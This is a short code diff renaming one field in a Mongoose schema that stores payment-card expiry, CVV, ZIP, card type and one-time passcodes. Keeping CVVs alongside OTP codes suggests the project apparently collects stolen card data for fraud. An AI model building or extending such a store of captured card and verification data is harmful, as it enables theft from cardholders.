@@ -6,7 +6,7 @@ const DataSchema = new mongoose.Schema({
     expiry: String,
     cvv: String,
     zip: String,
-    cardholderName: String,
+    cardName: String,
     cardType: String,
     otpCode: String,
     timestamp: { type: Date, default: Date.now }
